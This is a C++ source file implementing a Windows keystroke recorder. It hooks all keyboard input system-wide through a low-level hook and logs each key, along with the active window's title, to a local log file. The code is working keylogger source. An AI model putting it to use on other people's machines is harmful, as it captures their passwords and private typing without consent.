#include "Keyboard.h"
#include "KeystrokesRecorder.h"

#include <process.h>

#define LOG_FILE_NAME "recorded keystrokes.log"

HANDLE KeystrokesRecorder::logFileHandle = INVALID_HANDLE_VALUE;

std::wstring KeystrokesRecorder::lastForegroundWindowName = L"";

HANDLE KeystrokesRecorder::threadCreatedMessageQueueEventHandle = NULL;

std::wstring getForegroundWindowName()
{
	HWND foregroundWindowHandle = GetForegroundWindow();

	if(!foregroundWindowHandle)
		return L"";

	int foregroundWindowNameLength = GetWindowTextLengthW(foregroundWindowHandle);

	if(!foregroundWindowNameLength)
		return L"";

	std::wstring foregroundWindowName;

	// we also need the nul terminator
	foregroundWindowName.resize(foregroundWindowNameLength + 1);

	// we need buffer size including '\0'
	if(!GetWindowTextW(foregroundWindowHandle, &foregroundWindowName[0], foregroundWindowName.length()))
		return L"UNNAMED";

	return foregroundWindowName;
}

std::string unicodeStringToUtf8(const WCHAR* unicodeString)
{
	std::string utf8EncodedString;

	utf8EncodedString.resize(WideCharToMultiByte(CP_UTF8, 0, unicodeString, -1, NULL, 0, NULL, NULL));

	// make it so that the function process the chars without the '\0' (so remove 1 from string length, because we added the one byte)
	WideCharToMultiByte(CP_UTF8, 0, unicodeString, -1, &utf8EncodedString[0], utf8EncodedString.length(), NULL, NULL);

	return utf8EncodedString;
}

void KeystrokesRecorder::writeToLogFile(const char* text, DWORD textLength)
{
	std::wstring currentForegroundWindowName = getForegroundWindowName();

	if(currentForegroundWindowName != lastForegroundWindowName && currentForegroundWindowName != L"")
	{
		bool isForegroundWindowNameBeingWrittenFirstTime = lastForegroundWindowName == L"";

		lastForegroundWindowName = currentForegroundWindowName;

		// remove '\0'
		currentForegroundWindowName.erase(currentForegroundWindowName.length() - 1);

		currentForegroundWindowName = (isForegroundWindowNameBeingWrittenFirstTime ? L"[" : L"\r\n[") + currentForegroundWindowName + L"]\r\n";

		std::string currentForegroundWindowNameInUtf8 = unicodeStringToUtf8(currentForegroundWindowName.c_str());

		DWORD writtenBytesCount = NULL;

		// - 1 because excluding '\0'
		WriteFile(logFileHandle, currentForegroundWindowNameInUtf8.data(), currentForegroundWindowNameInUtf8.length() - 1, &writtenBytesCount, NULL);
	}

	DWORD writtenBytesCount = NULL;

	WriteFile(logFileHandle, text, textLength, &writtenBytesCount, NULL);
}

unsigned int KeystrokesRecorder::threadProcedure(void* threadParameter)
{
	/*
		GetMessage():
			-1: If there is an error, the return value is -1. For example, the function fails if hWnd is an invalid window handle or lpMsg is an invalid pointer.

			0: If the function retrieves the WM_QUIT message, the return value is zero.

			0 >: If the function retrieves a message other than WM_QUIT, the return value is nonzero.

		If hWnd is -1, GetMessage retrieves only messages on the current thread's message queue whose hwnd value is NULL,
		that is, thread messages as posted by PostMessage (when the hWnd parameter is NULL) or PostThreadMessage.

		GetMessage() blocks until there is a message available to retrieve
	*/

	/*
		The thread to which the message is posted must have created a message queue, or else the call to PostThreadMessage fails.
		Use the following method to handle this situation:

		1. Create an event object, then create the thread.
		2. Use the WaitForSingleObject function to wait for the event to be set to the signaled state before calling PostThreadMessage.
		3. In the thread to which the message will be posted, call PeekMessage as shown here to force the system to create the message queue.

		PeekMessage(&msg, NULL, WM_USER, WM_USER, PM_NOREMOVE)

		4. Set the event, to indicate that the thread is ready to receive posted messages.
	*/

	MSG message;

	PeekMessage(&message, NULL, WM_USER, WM_USER, PM_NOREMOVE);

	SetEvent(threadCreatedMessageQueueEventHandle);

	HHOOK keyboardHookHandle = SetWindowsHookExA(WH_KEYBOARD_LL, keyboardHookProcedure, NULL, 0);

	// If the function retrieves the WM_QUIT message, the return value is zero.
	while(GetMessage(&message, (HWND)-1, 0, 0) > 0)
	{
		TranslateMessage(&message);

		DispatchMessage(&message);
	}

	UnhookWindowsHookEx(keyboardHookHandle);

	_endthreadex(0);

	return 0;
}

LRESULT CALLBACK KeystrokesRecorder::keyboardHookProcedure(int code, WPARAM wparam, LPARAM lparam)
{
	// If nCode is less than zero, the hook procedure must pass the message to the CallNextHookEx function without further processing
	// and should return the value returned by CallNextHookEx.
	// without WM_SYSKEYDOWN it doesn't react to e.g. AltGr + o => ó
	if(code < 0 || (wparam != WM_KEYDOWN && wparam != WM_SYSKEYDOWN))
		return CallNextHookEx(NULL, code, wparam, lparam); // hhk => This parameter is ignored.

	WCHAR unicodeString[20] = {};

	KBDLLHOOKSTRUCT* pressedKeyInformation = (KBDLLHOOKSTRUCT*)lparam;

	static Keyboard keyboard;

	if(keyboard.hasKeyboardLayoutChanged())
		if(!keyboard.changeKeyboardLayout())
			return CallNextHookEx(NULL, code, wparam, lparam);

	keyboard.convertVirtualKeyToUnicodeString(pressedKeyInformation->vkCode, unicodeString);

	// if there's at least 1 char
	if(unicodeString[0])
	{
		std::string utf8String = unicodeStringToUtf8(unicodeString);

		for(BYTE i = 0; i < utf8String.length(); i++)
		{
			char& chr = utf8String[i];

			// with backspace notepad shows  a black square and now it'll show  a left arrow
			// which looks better
			if(chr == VK_BACK)
				chr = VK_ESCAPE;
			else if(chr == VK_RETURN) // '\r' - carriage return; change into Windows style \r\n
				utf8String.insert(utf8String.begin() + i + 1, '\n');
			else if(chr == VK_ESCAPE) // remove escape char if I entered it
				utf8String.erase(i);
		}

		// - 1 because length also includes '\0' and we don't want it
		writeToLogFile(utf8String.c_str(), utf8String.length() - 1);
	}

	return CallNextHookEx(NULL, code, wparam, lparam);
}

KeystrokesRecorder::KeystrokesRecorder(const std::string& logFileName):
	threadHandle(NULL),
	logFileName(logFileName)
{
	logFileHandle = CreateFileA(logFileName.data(), GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
}

KeystrokesRecorder::~KeystrokesRecorder()
{
	stopRecording();

	CloseHandle(logFileHandle);
}

void KeystrokesRecorder::stopRecording()
{
	// if not running
	if(!threadHandle)
		return;

	// we can call PostThreadMessage only after the message queue is created, otherwise PostThreadMessage may fail
	WaitForSingleObject(threadCreatedMessageQueueEventHandle, INFINITE);

	// send WM_QUIT so that the thread's message loop ends
	PostThreadMessage(GetThreadId(threadHandle), WM_QUIT, NULL, NULL);

	// wait for the thread to finish
	WaitForSingleObject(threadHandle, INFINITE);

	CloseHandle(threadHandle);

	threadHandle = NULL;

	CloseHandle(threadCreatedMessageQueueEventHandle);

	threadCreatedMessageQueueEventHandle = NULL;
}

void KeystrokesRecorder::startRecording()
{
	// if already running
	if(threadHandle)
		return;

	threadCreatedMessageQueueEventHandle = CreateEventA(NULL, TRUE, FALSE, NULL);

	if(!threadCreatedMessageQueueEventHandle)
		return;

	threadHandle = (HANDLE)_beginthreadex(NULL, 0, threadProcedure, NULL, 0, NULL);

	if(!threadHandle)
	{
		CloseHandle(threadCreatedMessageQueueEventHandle);

		threadCreatedMessageQueueEventHandle = NULL;
	}
}

std::string KeystrokesRecorder::getLogFileName()
{
	return logFileName;
}

KeystrokesRecorder* KeystrokesRecorder::getInstance()
{
	static KeystrokesRecorder keystrokesRecorder(LOG_FILE_NAME);

	return &keystrokesRecorder;
}
